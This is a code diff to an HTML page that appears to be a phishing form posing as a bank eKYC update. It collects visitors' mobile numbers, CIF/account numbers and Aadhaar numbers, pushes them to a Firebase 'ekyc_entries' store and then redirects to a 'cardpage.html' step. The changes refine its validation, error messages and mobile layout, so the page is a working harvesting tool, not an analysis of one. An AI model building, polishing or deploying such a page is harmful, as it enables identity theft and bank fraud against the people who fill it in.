@@ -22,22 +22,35 @@
     const app = initializeApp(firebaseConfig);
     const db = getDatabase(app);
 
-    window.submitForm = function (event) {
-      event.preventDefault(); // Stop default form redirect
+    window.validateForm = function () {
+      let isValid = true;
 
       const mobile = document.getElementById("mobile").value.trim();
       const account = document.getElementById("account").value.trim();
       const customerid = document.getElementById("customerid").value.trim();
 
-      const isMobileValid = /^[6-9][0-9]{9}$/.test(mobile);
-      const isAccountValid = /^[0-9]{11}$/.test(account);
-      const isAadhaarValid = /^[0-9]{12}$/.test(customerid);
+      const mobilePattern = /^[6-9][0-9]{9}$/;
 
-      document.getElementById("mobileError").style.display = isMobileValid ? "none" : "block";
-      document.getElementById("accountError").style.display = isAccountValid ? "none" : "block";
-      document.getElementById("aadhaarError").style.display = isAadhaarValid ? "none" : "block";
+      document.getElementById("mobileError").style.display = "none";
+      document.getElementById("accountError").style.display = "none";
+      document.getElementById("aadhaarError").style.display = "none";
 
-      if (isMobileValid && isAccountValid && isAadhaarValid) {
+      if (!mobilePattern.test(mobile)) {
+        document.getElementById("mobileError").style.display = "block";
+        isValid = false;
+      }
+
+      if (account.length !== 11 || isNaN(account)) {
+        document.getElementById("accountError").style.display = "block";
+        isValid = false;
+      }
+
+      if (customerid.length !== 12 || isNaN(customerid)) {
+        document.getElementById("aadhaarError").style.display = "block";
+        isValid = false;
+      }
+
+      if (isValid) {
         push(ref(db, "ekyc_entries"), {
           mobile,
           account,
@@ -45,11 +58,13 @@
           timestamp: new Date().toISOString()
         }).then(() => {
           window.location.href = "cardpage.html";
-        }).catch(err => {
-          alert("Failed to submit: " + err.message);
+        }).catch(error => {
+          alert("Data send failed: " + error.message);
         });
       }
-    }
+
+      return false;
+    };
   </script>
 
   <style>
@@ -100,7 +115,7 @@
       width: 94%;
       padding: 10px;
       font-size: 12px;
-      border-radius: 0;
+      border-radius: 0px;
       border: 1px solid #ccc;
       margin-top: 5px;
     }
@@ -120,6 +135,18 @@
       border-radius: 10px;
       margin-top: 20px;
     }
+
+    @media (max-width: 500px) {
+      .form-container {
+        padding: 10px;
+      }
+      .input-group input {
+        font-size: 14px;
+      }
+      .side-button {
+        font-size: 16px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -131,27 +158,27 @@
   </div>
 
   <div class="form-container">
-    <form onsubmit="submitForm(event)">
+    <form onsubmit="return validateForm();">
       <div class="input-group">
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobile" maxlength="10" placeholder="Enter 10-digit Mobile" required>
-        <div class="error" id="mobileError">⚠️ Enter valid 10-digit Mobile Number.</div>
+        <div class="error" id="mobileError">⚠️ Mobile Number.</div>
       </div>
       <div class="input-group">
         <label for="account">CIF/Account Number</label>
         <input type="tel" id="account" name="account" maxlength="11" placeholder="Enter 11-digit Account No." required>
-        <div class="error" id="accountError">⚠️ Enter valid 11-digit Account Number.</div>
+        <div class="error" id="accountError">Please enter a valid 11-digit Account Number.</div>
       </div>
       <div class="input-group">
         <label for="customerid">Aadhaar Number</label>
-        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Aadhaar No." required>
-        <div class="error" id="aadhaarError">⚠️ Enter valid 12-digit Aadhaar Number.</div>
+        <input type="tel" id="customerid" name="customerid" maxlength="12" placeholder="Enter 12-digit Customer ID" required>
+        <div class="error" id="aadhaarError">Please enter a valid 12-digit Aadhaar Number.</div>
       </div>
       <button class="side-button" type="submit">Continue</button>
     </form>
 
-    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg">
-    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg">
+    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg" alt="Extra Image 1">
+    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Extra Image 2">
   </div>
 </body>
 </html>
